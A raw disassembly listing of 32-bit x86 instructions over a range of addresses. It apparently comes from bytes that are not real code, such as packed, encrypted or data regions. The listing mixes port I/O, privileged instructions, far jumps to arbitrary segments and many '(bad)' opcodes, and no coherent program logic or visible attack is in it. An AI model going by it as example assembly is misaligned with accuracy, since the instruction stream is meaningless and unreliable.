  409149:	xchg   ebx,ecx
  40914b:	xor    bh,BYTE PTR ds:0x64e82768
  409151:	jns    0x409155
  409153:	pusha  
  409154:	and    dh,al
  409156:	adc    bh,ah
  409158:	aaa    
  409159:	and    eax,0x6f2573
  40915e:	loopne 0x409162
  409160:	mov    ?,WORD PTR [ebx-0x67]
  409163:	std    
  409164:	sbb    al,0x74
  409166:	mov    edx,0x23c106bf
  40916b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40916c:	in     al,0x14
  40916e:	fld    st(7)
  409170:	pop    ds
  409171:	ins    BYTE PTR es:[edi],dx
  409172:	jno    0x4091c5
  409174:	fwait
  409175:	pusha  
  409176:	inc    ecx
  409177:	mov    ds:0x61f49bda,eax
  40917c:	shr    BYTE PTR [edx],0xb
  40917f:	add    bh,BYTE PTR [edi-0x5651d5c8]
  409185:	sahf   
  409186:	mov    esi,0x5c6e3008
  40918b:	test   al,0xc6
  40918d:	xor    esi,edi
  40918f:	fs xchg esi,eax
  409191:	sub    al,0xd6
  409193:	icebp  
  409194:	cmp    ebp,esi
  409196:	sub    DWORD PTR [esi+0x46],ecx
  409199:	inc    esp
  40919a:	jge    0x409123
  40919c:	adc    al,0xf6
  40919e:	aam    0x9d
  4091a0:	aam    0xe9
  4091a2:	xor    BYTE PTR [ebx+0x1c],ch
  4091a5:	inc    esi
  4091a6:	cwde   
  4091a7:	mov    edi,0xd26e7da
  4091ac:	mov    eax,ds:0x3d504135
  4091b1:	xor    esi,ebp
  4091b3:	stos   BYTE PTR es:[edi],al
  4091b4:	ins    DWORD PTR es:[edi],dx
  4091b5:	add    BYTE PTR [ebp+0x4b],ch
  4091b8:	inc    edx
  4091b9:	or     DWORD PTR ds:0x3a44fb3b,ecx
  4091bf:	dec    ebp
  4091c0:	or     DWORD PTR [edx],ebx
  4091c2:	or     eax,DWORD PTR [edx+0x2f0418a5]
  4091c8:	iret   
  4091c9:	xchg   ecx,eax
  4091ca:	pop    eax
  4091cb:	mov    ecx,0x89cfa07e
  4091d0:	ds mov bl,0x68
  4091d3:	test   eax,0xdcb5a522
  4091d8:	ds sub eax,0xc321f8cf
  4091de:	(bad)  
  4091df:	stc    
  4091e0:	repnz mov dl,0xc2
  4091e3:	sbb    bh,BYTE PTR [esi+0x374331f2]
  4091e9:	mov    eax,0x91ca6df0
  4091ee:	ins    DWORD PTR es:[edi],dx
  4091ef:	mov    ecx,0xf0831b7f
  4091f4:	or     eax,DWORD PTR [eax-0x2a5b806f]
  4091fa:	repnz pop eax
  4091fc:	mov    ds:0x9b39e60c,al
  409201:	int3   
  409202:	push   cs
  409203:	pop    ds
  409204:	mov    dl,0x2f
  409206:	mov    al,ds:0x6ea352a1
  40920b:	aaa    
  40920c:	inc    eax
  40920d:	shl    BYTE PTR [ebx],0xd6
  409210:	mov    edx,0x9cb3eba1
  409215:	cmp    al,0xe
  409217:	sahf   
  409218:	aaa    
  409219:	jecxz  0x4091d6
  40921b:	shl    BYTE PTR [edx-0x668a6043],1
  409221:	xchg   ebx,eax
  409222:	scas   al,BYTE PTR es:[edi]
  409223:	fnstenv [esp+eax*8-0x7ff5f961]
  40922a:	and    DWORD PTR [ecx],eax
  40922c:	retf   
  40922d:	inc    edi
  40922e:	cmc    
  40922f:	stos   BYTE PTR es:[edi],al
  409230:	out    dx,al
  409231:	iret   
  409232:	mov    ch,0xb7
  409234:	popa   
  409235:	fwait
  409236:	xchg   edi,eax
  409237:	in     eax,dx
  409238:	out    0xad,eax
  40923a:	dec    ebp
  40923b:	jne    0x40921d
  40923d:	out    0xb,al
  40923f:	push   0xffffffdc
  409241:	scas   al,BYTE PTR es:[edi]
  409242:	cmp    esi,DWORD PTR [ebp+0x4b]
  409245:	lods   eax,DWORD PTR ds:[esi]
  409246:	pop    ecx
  409247:	adc    edx,DWORD PTR [ebp-0x16dc24eb]
  40924d:	les    edx,FWORD PTR [edx+0x53bb4f8f]
  409253:	mov    dl,0xdc
  409255:	and    eax,0x28f1a7fb
  40925a:	aad    0x9f
  40925c:	jg     0x40923b
  40925e:	mov    ebp,0x223a9e05
  409263:	sar    ch,0xa7
  409266:	cdq    
  409267:	xchg   DWORD PTR [ebx],esi
  409269:	cs call 0xc7b09df3
  40926f:	nop
  409270:	ss es sbb al,0xc7
  409274:	ret    
  409275:	xor    eax,DWORD PTR ds:[ebp+0x2b]
  409279:	neg    BYTE PTR [edi-0x28a36ff4]
  40927f:	popa   
  409280:	popf   
  409281:	jbe    0x4092f0
  409283:	jne    0x409276
  409285:	imul   DWORD PTR [eax]
  409287:	mov    dl,0xf7
  409289:	dec    eax
  40928a:	sbb    ah,BYTE PTR [esi+0xb]
  40928d:	stc    
  40928e:	push   0x716a121b
  409293:	aam    0xe7
  409295:	push   0x43
  409297:	(bad)  
  409298:	(bad)  
  409299:	fadd   QWORD PTR [esi]
  40929b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40929c:	mov    al,ds:0x62258647
  4092a1:	or     al,0x5b
  4092a3:	mov    dl,dh
  4092a5:	fs stos DWORD PTR es:[edi],eax
  4092a7:	ja     0x40929b
  4092a9:	xchg   DWORD PTR [eax],eax
  4092ab:	lahf   
  4092ac:	into   
  4092ad:	sbb    ecx,DWORD PTR [ebx-0x68]
  4092b0:	mov    ebp,0x87b4946d
  4092b5:	ret    0xd1f9
  4092b8:	popa   
  4092b9:	dec    ecx
  4092ba:	sbb    al,0xc7
  4092bc:	pushf  
  4092bd:	(bad)  
  4092be:	jp     0x40924c
  4092c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092c1:	sbb    al,0xdc
  4092c3:	and    al,0x1a
  4092c5:	or     ebp,DWORD PTR [eax-0x3f]
  4092c8:	ffreep st(6)
  4092ca:	and    al,0xae
  4092cc:	jmp    0xe024:0xf99619d4
  4092d3:	and    ch,BYTE PTR [esi+0x2a]
  4092d6:	jb     0x409273
  4092d8:	add    al,0x67
  4092da:	ins    DWORD PTR es:[edi],dx
  4092db:	out    dx,al
  4092dc:	sbb    eax,0xec8e9586
  4092e1:	mov    ebp,DWORD PTR [edx]
  4092e3:	sub    edi,eax
  4092e5:	adc    al,0x1c
  4092e7:	cwde   
  4092e8:	push   ebp
  4092e9:	cmp    DWORD PTR [ecx-0x1d],edx
  4092ec:	rol    edi,0x64
  4092ef:	mov    ds:0x515c4497,eax
  4092f4:	outs   dx,BYTE PTR ds:[esi]
  4092f5:	sub    BYTE PTR [esi],0xae
  4092f8:	(bad)  
  4092f9:	xor    eax,0xc3dc08c1
  4092fe:	cdq    
  4092ff:	lahf   
  409300:	push   edi
  409301:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409302:	call   0x24e9de31
  409307:	cmp    al,0x1
  409309:	mov    DWORD PTR [edi],ebx
  40930b:	inc    eax
  40930c:	cmc    
  40930d:	pop    eax
  40930e:	jle    0x409345
  409310:	push   ebp
  409311:	jb     0x4092ce
  409313:	adc    DWORD PTR [edi-0x3b93aa24],ebp
  409319:	in     eax,dx
  40931a:	pop    eax
  40931b:	and    esi,0x186a0fc0
  409321:	int    0x2c
  409323:	mov    dh,0x6f
  409325:	cmp    al,0x45
  409327:	pop    esp
  409328:	cmp    ecx,DWORD PTR [eax-0x251a266c]
  40932e:	xor    ebx,DWORD PTR ds:0x4a123b1b
  409334:	js     0x409371
  409336:	jns    0x409315
  409338:	into   
  409339:	jge    0x40938a
  40933b:	xchg   edx,eax
  40933c:	sahf   
  40933d:	cdq    
  40933e:	loopne 0x409365
  409340:	jnp    0x40939e
  409342:	mov    ?,WORD PTR [ecx+0x49811063]
  409348:	(bad)  
  409349:	arpl   WORD PTR [ebx],dx
  40934b:	xor    al,0x67
  40934d:	inc    edi
  40934e:	hlt    
  40934f:	shl    BYTE PTR [ebp-0x13],cl
  409352:	xor    edx,eax
  409354:	xor    edi,DWORD PTR [eax+ebp*1-0x54]
  409358:	ret    
  409359:	in     eax,0x33
  40935b:	int    0x1e
  40935d:	mov    ecx,0xde3b7c01
  409362:	mov    BYTE PTR [edx+0x37],ah
  409365:	sbb    ebx,ebp
  409367:	xchg   ebp,eax
  409368:	mov    ebx,0xfedc43fd
  40936d:	imul   eax,DWORD PTR [esi+0x56],0xffffffc7
  409371:	loopne 0x40938b
  409373:	push   0x8783a641
  409378:	inc    edx
  409379:	dec    ebp
  40937a:	pop    esi
  40937b:	and    bh,BYTE PTR [eax+eax*2-0x4e]
  40937f:	add    BYTE PTR [ebp-0x3d],al
  409382:	jno    0x4093eb
  409384:	pushf  
  409385:	push   edi
  409386:	cmp    al,0x24
  409388:	mov    al,ds:0xb7b537fd
  40938d:	dec    edx
  40938e:	imul   ecx,ecx,0xffffff90
  409391:	out    dx,eax
  409392:	ret    0x871
  409395:	scas   eax,DWORD PTR es:[edi]
  409396:	(bad)  
  409398:	ret    
  409399:	mov    ah,0x18
  40939b:	call   0xe950b539
  4093a0:	mov    esp,0xffc64828
  4093a5:	pop    eax
  4093a6:	sub    ebx,DWORD PTR [esi+eax*8+0x5975ddf9]
  4093ad:	lods   eax,DWORD PTR ds:[esi]
  4093ae:	xchg   esp,eax
  4093af:	sub    edi,DWORD PTR [esi+esi*1-0x27]
  4093b3:	mov    ch,0xc5
  4093b5:	maxps  xmm4,xmm1
  4093b8:	and    bh,BYTE PTR [ebp+0x7e993c18]
  4093be:	stc    
  4093bf:	mov    eax,ds:0x210540f7
  4093c4:	pop    ebx
  4093c5:	push   ecx
  4093c6:	into   
  4093c7:	fwait
  4093c8:	xchg   DWORD PTR [esi],esp
  4093ca:	enter  0x7a33,0xd0
  4093ce:	sub    eax,0x6ae285d0
  4093d3:	imul   edx,DWORD PTR [ebx-0x4c],0x59
  4093d7:	shr    BYTE PTR [ebx+0x4b480005],cl
  4093dd:	fiadd  DWORD PTR [eax-0x7c]
  4093e0:	push   es
  4093e1:	mov    ebp,0x9e1825ac
  4093e6:	and    BYTE PTR [ebx+ebx*2-0x40a0bcda],0xd4
  4093ee:	mov    esi,0x886c90da
  4093f3:	push   ebx
  4093f4:	dec    esi
  4093f5:	jge    0x409387
  4093f7:	jp     0x409457
  4093f9:	jae    0x4093f0
  4093fb:	lahf   
  4093fc:	xlat   BYTE PTR ds:[ebx]
  4093fd:	inc    ebx
  4093fe:	mov    al,ds:0x999a568
  409404:	mov    edi,0x19965ece
  409409:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40940a:	jbe    0x4093cf
  40940c:	mov    ds:0x19b9b082,eax
  409411:	inc    esp
  409412:	mov    eax,ds:0xa0f1e3e9
  409417:	cs clc 
  409419:	aaa    
  40941a:	xchg   esi,eax
  40941b:	pop    ebp
  40941c:	xor    esi,DWORD PTR [ebx+0x1c]
  40941f:	mov    ds:0x334bbdbb,al
  409424:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409425:	jmp    0xbe4:0x4eca1bef
  40942c:	mov    esi,0xa4be7947
  409431:	sub    eax,0xb3107e97
  409436:	je     0x4094af
  409438:	jno    0x4093e4
  40943a:	sub    BYTE PTR [edx-0x48],dl
  40943d:	pop    ecx
  40943e:	xchg   cl,bl
  409440:	stc    
  409441:	push   ss
  409442:	jp     0x4094a0
  409444:	cmp    ah,BYTE PTR [edi+0xa437fcb]
  40944a:	mov    ah,0xc0
  40944c:	mov    cl,0xdf
  40944e:	pop    DWORD PTR [ecx-0x36]
  409451:	push   ss
  409452:	jns    0x409414
  409454:	(bad)  
  409455:	pusha  
  409456:	fiadd  WORD PTR [ebx+0x6d]
  409459:	aas    
  40945a:	ss ret 
  40945c:	test   BYTE PTR [ebx],dh
  40945e:	push   0x842bc793
  409463:	or     ah,ch
  409465:	xor    eax,DWORD PTR [esi-0x2f]
  409468:	sub    ebp,DWORD PTR [eax]
  40946a:	sbb    al,0x52
  40946c:	mov    esp,0x613c368c
  409471:	std    
  409472:	adc    dh,cl
  409474:	push   cs
  409475:	sbb    bl,ch
  409477:	and    DWORD PTR [ecx],ecx
  409479:	mov    eax,ds:0x3d1b7287
  40947e:	mov    ebp,0xeb211567
  409483:	not    DWORD PTR [ecx+0x2d]
  409486:	jns    0x409433
  409488:	scas   al,BYTE PTR es:[edi]
  409489:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40948a:	ror    DWORD PTR [ebx+0x79],cl
  40948d:	mov    esi,ebp
  40948f:	stos   BYTE PTR es:[edi],al
  409490:	mov    cl,0x71
  409492:	mov    al,ds:0x7a49fc5a
  409497:	je     0x4094f5
  409499:	pusha  
  40949a:	loopne 0x4094d9
  40949c:	dec    ebp
  40949d:	push   esp
  40949e:	xchg   ecx,eax
  40949f:	xchg   edi,eax
  4094a0:	jmp    0xa71:0x82c4ae05
  4094a7:	pusha  
  4094a8:	push   cs
  4094a9:	sbb    dh,BYTE PTR [ecx-0x31]
  4094ac:	pop    edi
  4094ad:	ds push 0xa5a058a6
  4094b3:	shl    BYTE PTR [esi-0x38c1c093],cl
  4094b9:	test   DWORD PTR [edx+0x799213db],edx
  4094bf:	and    eax,0xa97d9324
  4094c4:	mov    DWORD PTR [eax-0x47b3c6f7],ebp
  4094ca:	ss or  bl,0x6f
  4094ce:	mov    bh,0x84
  4094d0:	cld    
  4094d1:	xor    BYTE PTR [esi+eax*4+0xd4fa5d6],0x8b
  4094d9:	jl     0x40948b
  4094db:	push   esi
  4094dc:	outs   dx,BYTE PTR ds:[esi]
  4094dd:	enter  0x1d22,0x84
  4094e1:	rcl    BYTE PTR [esi],1
  4094e3:	mov    cl,BYTE PTR [eax-0x79cfe900]
  4094e9:	mov    cs,WORD PTR [eax]
  4094eb:	push   esp
  4094ec:	sbb    eax,0xd78cb86f
  4094f1:	mov    ebx,0x185d60ff
  4094f6:	jb     0x40952b
  4094f8:	ret    
  4094f9:	push   ss
  4094fa:	mov    al,0x72
  4094fc:	fisttp WORD PTR [ebx+0x43]
  4094ff:	sbb    eax,0xb3ddab7a
  409504:	jo     0x409541
  409506:	arpl   WORD PTR [ebp-0x19fae595],dx
  40950c:	inc    esp
  40950d:	adc    esp,DWORD PTR [edx-0x34]
  409510:	mov    ah,0x8c
  409512:	int3   
  409513:	push   cs
  409514:	ss (bad) 
  409516:	push   edx
  409517:	or     BYTE PTR [edi],al
  409519:	cwde   
  40951a:	repz pop es
  40951c:	arpl   WORD PTR [edx+0x2],ax
  40951f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409520:	or     esi,ebx
  409522:	mov    dh,0x80
  409524:	ja     0x409540
  409526:	dec    esi
  409527:	aas    
  409528:	jmp    0x1ff060af
  40952d:	xor    DWORD PTR [edx-0x44],edx
  409530:	or     al,0x7f
  409532:	fs pop di
  409535:	rol    BYTE PTR [edi+0x4b],0xdf
  409539:	cmp    eax,0x2e368eaf
  40953e:	test   eax,0x565e9056
  409543:	inc    eax
  409544:	add    ecx,0x79
  409547:	es jno 0x4095af
  40954a:	mov    BYTE PTR [edi+0x57],cl
  40954d:	lods   al,BYTE PTR ds:[esi]
  40954e:	out    dx,al
  40954f:	data16 into 
  409551:	shl    BYTE PTR [ecx+ebx*8],1
  409554:	ror    BYTE PTR [edx-0x79],cl
  409557:	pop    ds
  409558:	and    edx,ecx
  40955a:	push   ebp
  40955b:	dec    edx
  40955c:	pop    es
  40955d:	cli    
  40955e:	repnz out dx,eax
  409560:	popf   
  409561:	dec    ebp
  409562:	add    ebx,0x55
  409565:	xchg   edx,eax
  409566:	ss loopne 0x4095d2
  409569:	xor    esp,ecx
  40956b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40956c:	sti    
  40956d:	ins    DWORD PTR es:[edi],dx
  40956e:	add    esp,DWORD PTR [eax]
  409570:	pop    ds
  409571:	adc    cl,BYTE PTR [ebx+0x6593f053]
  409577:	mov    edi,DWORD PTR [ebx-0x5e]
  40957a:	dec    esp
  40957b:	call   0x3aa6:0xb39e8da3
  409582:	jns    0x4095cd
  409584:	mov    edx,0xb7c25f9
  409589:	ficom  DWORD PTR ds:0x952dc7b8
  40958f:	ins    DWORD PTR es:[edi],dx
  409590:	add    eax,0xf36faac9
  409595:	gs popf 
  409597:	subps  xmm6,XMMWORD PTR [eax-0x6b]
  40959b:	inc    ecx
  40959c:	out    0x84,eax
  40959e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40959f:	clc    
  4095a0:	adc    ch,BYTE PTR [ebx]
  4095a2:	add    BYTE PTR [ecx],bl
  4095a4:	mov    ?,ebp
  4095a6:	xor    al,0x24
  4095a8:	ret    0xa3c9
  4095ab:	out    0xc7,eax
  4095ad:	mov    ebx,0x952dada4
  4095b2:	push   eax
  4095b3:	aam    0x5e
  4095b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095b6:	or     DWORD PTR [edi],0xffffff84
  4095b9:	shl    DWORD PTR [esi+0x3e],cl
  4095bc:	xchg   ebx,eax
  4095bd:	mov    esp,DWORD PTR [eax-0x4533dd59]
  4095c3:	mov    dh,0xac
  4095c5:	out    dx,al
  4095c6:	xchg   esi,eax
  4095c7:	repnz out 0x18,al
  4095ca:	or     edx,DWORD PTR [edi]
  4095cc:	dec    ecx
  4095cd:	retf   
  4095ce:	ret    0x3bde
  4095d1:	mov    DWORD PTR [eax],esi
  4095d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095d4:	jge    0x409599
  4095d6:	add    DWORD PTR [esi+eax*4+0x4d],0xffffffd2
  4095db:	in     al,dx
  4095dc:	leave  
  4095dd:	or     ah,BYTE PTR [ebx-0xadfa43d]
  4095e3:	xchg   esi,eax
  4095e4:	and    DWORD PTR [ebx-0x3],eax
  4095e7:	or     edx,0x78
  4095ea:	sbb    ebp,DWORD PTR [esi]
  4095ec:	into   
  4095ed:	iretw  
  4095ef:	jns    0x409602
  4095f1:	inc    esp
  4095f2:	dec    edx
  4095f3:	fwait
  4095f4:	or     al,0xf3
  4095f6:	mov    eax,ds:0xcfa72204
  4095fb:	cli    
  4095fc:	jnp    0x409607
  4095fe:	jl     0x4095e5
  409600:	hlt    
  409601:	int3   
  409602:	inc    edx
  409603:	inc    ecx
  409604:	jmp    0xf283447
  409609:	bound  ebp,QWORD PTR [ebp+0x7fedc7d1]
  40960f:	retf   0xc5e1
  409612:	je     0x409671
  409614:	lahf   
  409615:	adc    esi,DWORD PTR [ebp+0x35739dd5]
  40961b:	mov    ah,0x7d
  40961d:	in     al,0xb2
  40961f:	add    al,0xb8
  409621:	and    esp,eax
  409623:	les    ecx,FWORD PTR [ebp+0x52ad98ef]
  409629:	aam    0x55
  40962b:	pop    ds
  40962c:	sub    BYTE PTR [edi+0x71],0x90
  409630:	lea    edi,[ecx-0x40f231f3]
  409636:	jo     0x4096ac
  409638:	jle    0x409694
  40963a:	stos   DWORD PTR es:[edi],eax
  40963b:	out    0x41,al
  40963d:	adc    ah,BYTE PTR [eax+edx*2-0x58]
  409641:	cmp    al,0x87
  409643:	push   edi
  409644:	cwde   
  409645:	push   ebp
  409646:	rcr    DWORD PTR [ecx-0x31],cl
  409649:	add    DWORD PTR [edx+edi*1-0x7bcb1a4a],ebp
  409650:	xor    eax,0xa26ade72
  409655:	nop
  409656:	sub    dl,al
  409658:	les    eax,FWORD PTR [ebp-0x4e95a8de]
  40965e:	lock push 0x2f4fe77e
  409664:	std    
  409665:	mov    dh,0x2e
  409667:	aaa    
  409668:	or     BYTE PTR [ebx-0x63e79a17],bl
  40966e:	sub    DWORD PTR [eax-0x53234658],ecx
  409674:	sub    BYTE PTR [edi+edx*2-0x1e23d49b],dh
  40967b:	mov    ds:0x7b056302,al
  409680:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409681:	popf   
  409682:	adc    eax,0x5fb06f65
  409687:	mov    WORD PTR fs:[ebx+esi*1+0x1598c9dd],ss
  40968f:	mov    ebp,0xbae7dc7b
  409694:	xchg   edx,eax
  409695:	or     dl,dh
  409697:	in     eax,0x73
  409699:	xchg   ecx,eax
  40969a:	outs   dx,DWORD PTR ds:[esi]
  40969b:	xchg   edi,eax
  40969c:	inc    ecx
  40969d:	int3   
  40969e:	jbe    0x40964b
  4096a0:	pop    esp
  4096a1:	imul   ebx,DWORD PTR [esi-0x66],0x32
  4096a5:	jnp    0x4096eb
  4096a7:	data16 and ch,BYTE PTR [ebx+ecx*4]
  4096ab:	sbb    esp,DWORD PTR [esi-0x2570e4e6]
  4096b1:	and    edi,DWORD PTR [edi+0x35]
  4096b4:	test   DWORD PTR [ebx-0x2d],0xf962e34c
  4096bb:	retf   0xb2a7
  4096be:	mov    ch,0xee
  4096c0:	push   edx
  4096c1:	push   eax
  4096c2:	pop    eax
  4096c3:	and    dh,BYTE PTR [esi+0x4c1b40de]
  4096c9:	pop    edi
  4096ca:	and    BYTE PTR ds:0xd72fd4d9,bl
  4096d0:	xor    ecx,DWORD PTR [esi-0x4c56b9ee]
  4096d6:	or     eax,0x32249122
  4096db:	fstp   QWORD PTR [eax-0x435e940e]
  4096e1:	test   al,0x30
  4096e3:	cmp    DWORD PTR [ebp+0xf],esp
  4096e6:	out    dx,al
  4096e7:	mov    eax,ds:0xf2ec423a
  4096ec:	cwde   
  4096ed:	icebp  
  4096ee:	cld    
  4096ef:	xchg   edi,eax
  4096f0:	mov    ah,0x58
  4096f2:	pop    esp
  4096f3:	sub    bh,BYTE PTR [ebx+edi*8]
  4096f6:	sub    eax,0x453f6dbc
  4096fb:	or     BYTE PTR [edx-0x7b],0xab
  4096ff:	pop    ss
  409700:	gs push ebp
  409702:	sbb    BYTE PTR [ebx+0x19c1a7ea],al
  409708:	in     eax,dx
  409709:	sar    dl,1
  40970b:	or     dl,ah
  40970d:	fisub  DWORD PTR [ecx]
  40970f:	xchg   ecx,eax
  409710:	fsub   DWORD PTR [ebx+0x1]
  409713:	dec    edx
  409714:	cmp    BYTE PTR [edi+0x0],cl
  409717:	mov    bh,0xe8
  409719:	out    0xad,eax
  40971b:	jo     0x4096ae
  40971d:	aas    
  40971e:	cmp    eax,0x1cb29169
  409723:	das    
  409724:	push   esp
  409725:	sub    ecx,esp
  409727:	xor    bl,BYTE PTR [esi-0x77280230]
  40972d:	(bad)  
  40972e:	shr    DWORD PTR [edx-0xb],0xed
  409732:	loop   0x40974e
  409734:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409735:	add    eax,0x64ac801d
  40973a:	addr16 pop ebx
  40973c:	mov    ecx,DWORD PTR [ecx]
  40973e:	jnp    0x409776
  409740:	cmp    eax,0xa0141c53
  409745:	mov    ebp,0x1833f526
  40974a:	jns    0x4097b7
  40974c:	in     al,dx
  40974d:	jno    0x409760
  40974f:	pop    ds
  409750:	mov    dl,0x2f
  409752:	or     BYTE PTR [eax-0x66],0xf0
  409756:	jl     0x409756
  409758:	mov    ebx,0xd1e9720a
  40975d:	loop   0x409707
  40975f:	add    al,0x22
  409761:	mov    WORD PTR [ebx+edi*8-0x5327284d],?
  409768:	ret    
  409769:	ror    DWORD PTR [esi+ecx*4+0x5b],1
  40976d:	sbb    eax,0x9bd758f8
  409772:	int    0x1f
  409774:	fwait
  409775:	repz std 
  409777:	or     al,0xee
  409779:	inc    ecx
  40977a:	push   ds
  40977b:	sub    DWORD PTR [ebp+0x7],eax
  40977e:	mov    al,ds:0x8ecfa0bb
  409783:	stc    
  409784:	sub    BYTE PTR [esi-0x10ce41e8],ch
  40978a:	jnp    0x409795
  40978c:	ss sub eax,0xe2e78469
  409792:	sti    
  409793:	mov    DWORD PTR [edi-0x50d38aad],edx
  409799:	mov    ebx,0x2063d816
  40979e:	(bad)  
  40979f:	sbb    ah,ch
  4097a1:	push   ds
  4097a2:	push   ss
  4097a3:	iret   
  4097a4:	mov    ecx,esi
  4097a6:	pop    ds
  4097a7:	sub    eax,0x1c9f86b9
  4097ac:	gs xchg ebp,eax
  4097ae:	pop    edi
  4097af:	adc    DWORD PTR [esi+0x2c],ebp
  4097b2:	lods   al,BYTE PTR ds:[esi]
  4097b3:	mov    dl,0x4f
  4097b5:	xor    al,0x33
  4097b7:	rep stos BYTE PTR es:[edi],al
  4097b9:	cmc    
  4097ba:	mov    esp,0xe70a39ec
  4097bf:	cld    
  4097c0:	lahf   
  4097c1:	cmp    ecx,DWORD PTR [esi+0x4d]
  4097c4:	dec    edi
  4097c5:	loopne 0x409808
  4097c7:	dec    eax
  4097c8:	fidiv  DWORD PTR [eax+0x2b5d8c7a]
  4097ce:	mov    ds:0x73c91288,eax
  4097d3:	and    cl,BYTE PTR [edi-0x3e]
  4097d6:	nop
  4097d7:	ret    0x4bee
  4097da:	das    
  4097db:	adc    DWORD PTR [ecx-0x2a],edi
  4097de:	or     eax,0x62ba2d05
  4097e3:	cmp    ebp,DWORD PTR [eax-0x6fde86e]
  4097e9:	adc    edi,edi
  4097eb:	js     0x4097d4
  4097ed:	adc    bl,BYTE PTR [esi-0x76]
  4097f0:	or     al,0x9d
  4097f2:	lock mov eax,ds:0xa8b6cc20
  4097f8:	aad    0xa8
  4097fa:	push   esp
  4097fb:	adc    ebp,DWORD PTR [ecx]
  4097fd:	lahf   
  4097fe:	icebp  
  4097ff:	add    edx,0xffffffa7
  409802:	dec    ecx
  409803:	or     dh,al
  409805:	imul   BYTE PTR [ecx]
  409807:	scas   eax,DWORD PTR es:[edi]
  409808:	js     0x4097d4
  40980a:	int    0x4b
  40980c:	adc    edi,ebx
  40980e:	jno    0x40983d
  409810:	neg    BYTE PTR [edi+0x259d40ac]
  409816:	xchg   edi,eax
  409817:	iret   
  409818:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409819:	inc    eax
  40981a:	or     al,BYTE PTR [eax-0x73993c27]
  409820:	arpl   bx,ax
  409822:	push   esp
  409823:	and    DWORD PTR [esi+0x59],edx
  409826:	addr16 xchg edi,eax
  409828:	push   0xf6a6155b
  40982d:	mov    ebp,0x1f766748
  409832:	je     0x4097f0
  409834:	cmp    DWORD PTR [edi-0x20261835],edi
  40983a:	pop    ebx
  40983b:	ins    DWORD PTR es:[edi],dx
  40983c:	xchg   BYTE PTR [edi+0x6e29b8c0],ah
  409842:	iret   
  409843:	adc    al,0xfb
  409845:	(bad)  
  409847:	push   0xffffff8c
  409849:	mov    ecx,0xda0965d6
  40984e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40984f:	lea    edi,[edi-0x7a9ec7e1]
  409855:	sbb    eax,0x9a8096cf
  40985a:	mov    al,ds:0xce76a528
  40985f:	retf   
  409860:	stos   BYTE PTR es:[edi],al
  409861:	pop    edx
  409862:	cld    
  409863:	mov    ah,0xb5
  409865:	cmp    ah,dl
  409867:	into   
  409868:	mov    dh,0xd7
  40986a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40986b:	sbb    al,0x4
  40986d:	or     DWORD PTR [eax+0x4f],esp
  409870:	ins    DWORD PTR es:[edi],dx
  409871:	loope  0x409828
  409873:	scas   al,BYTE PTR es:[edi]
  409874:	and    dl,bh
  409876:	dec    ecx
  409877:	jmp    0x7757877d
  40987c:	test   eax,0x1dcdcf6f
  409881:	lahf   
  409882:	stc    
  409883:	and    bl,BYTE PTR [edx-0x18]
  409886:	push   edi
  409887:	or     ecx,esp
  409889:	pop    ebx
  40988a:	jmp    0x40989e
  40988c:	sar    BYTE PTR [edx-0x7d6dc76c],0x55
  409893:	call   0xff539efd
  409898:	xchg   edi,eax
  409899:	(bad)  
  40989a:	jns    0x409899
  40989c:	push   0xffffffec
  40989e:	loop   0x40991b
  4098a0:	push   edx
  4098a1:	clc    
  4098a2:	xchg   ebx,eax
  4098a3:	sub    al,0x6b
  4098a5:	and    BYTE PTR [eax+0x7],ah
  4098a8:	aas    
  4098a9:	mov    ecx,0x56472207
  4098ae:	mov    DWORD PTR [edx+esi*4-0x3a],ebx
  4098b2:	aas    
  4098b3:	or     eax,0x701946a2
  4098b8:	mov    dh,0x64
  4098ba:	mov    al,0x56
  4098bc:	jo     0x40984d
  4098be:	fstp   QWORD PTR [ebx]
  4098c0:	loope  0x409932
  4098c2:	mov    ebp,0x32e6a3f2
  4098c7:	push   0x6e4b2fca
  4098cc:	je     0x4098e7
  4098ce:	xchg   DWORD PTR [edi],ebx
  4098d0:	inc    ecx
  4098d1:	add    eax,0x5a0ed997
  4098d6:	and    BYTE PTR [eax],ch
  4098d8:	xor    DWORD PTR [ecx],ebx
  4098da:	push   0xb9aa78b4
  4098df:	lahf   
  4098e0:	out    0x5c,eax
  4098e2:	scas   al,BYTE PTR es:[edi]
  4098e3:	in     eax,dx
  4098e4:	sti    
  4098e5:	test   al,0x7d
  4098e7:	mov    edx,0x7cad8c2b
  4098ec:	test   al,0x8b
  4098ee:	pop    DWORD PTR [esi]
  4098f0:	xchg   ecx,eax
  4098f1:	xchg   ebx,eax
  4098f2:	push   eax
  4098f3:	sti    
  4098f4:	or     al,0x7f
  4098f6:	stos   DWORD PTR es:[edi],eax
  4098f7:	(bad)  
  4098f8:	clc    
  4098f9:	test   DWORD PTR [edi],0x7854c7e0
  4098ff:	je     0x4098ed
  409901:	std    
  409902:	imul   eax,DWORD PTR [edx+0x769cbd69],0xffffffac
  409909:	sub    dh,0xaa
  40990c:	rcl    DWORD PTR [eax],cl
  40990e:	or     edi,edx
  409910:	sbb    al,0xe3
  409912:	dec    ecx
  409913:	push   ss
  409914:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409915:	sub    eax,0xe573dc6e
  40991a:	imul   ebp,DWORD PTR [eax-0x50],0x1250baaa
  409921:	lds    ebx,FWORD PTR [esi+0x34]
  409924:	hlt    
  409925:	iret   
  409926:	imul   ebp,DWORD PTR [edx+0x13],0xd693302d
  40992d:	mov    DWORD PTR [edx],ebp
